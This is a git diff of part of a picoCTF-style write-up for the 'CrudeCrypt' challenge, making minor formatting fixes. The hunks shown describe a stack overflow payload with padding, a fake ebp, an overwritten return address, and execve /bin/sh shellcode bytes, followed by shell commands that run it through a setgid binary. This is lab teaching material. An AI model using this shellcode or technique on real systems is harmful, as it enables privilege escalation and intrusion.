@@ -87,7 +87,7 @@ As shown above, the `strncpy` will now copy up to the next null byte onto the st
 In my exploit, I placed my shellcode after the return address. Because ASLR is disabled, I didn't have to use any fancy techniques, I could just find the address of the start of the shellcode and overwrite the return address with that address. I determined the second byte after the return address to be located at `0xffffd5d1` using gdb and some experimentation (second because it requires one byte of padding before the shellcode). Below is my payload:
 
 ```txt
- filler
+filler
 aaaaaaaa
 
 fake ebp
@@ -103,7 +103,7 @@ shellcode (execve /bin/sh)
 \xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 
 terminating null byte
-\00
+\x00
 ```
 
 I then encrypt this with my custom crude_crypt and decrypt with the supplied setgid crude_crypt in `/home/crudecrypt`:
@@ -114,7 +114,6 @@ pico46900@shell:~$ ./crude_crypt encrypt payload payload.enc
 -=- Welcome to CrudeCrypt 0.1 Beta -=-
 -> File password: a
 
-Got hostname into header, got 'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk`�`'
 => Encrypted file successfully
 pico46900@shell:~$ cd /home/crudecrypt
 pico46900@shell:/home/crudecrypt$ ./crude_crypt decrypt ~/payload.enc ~/payload.out
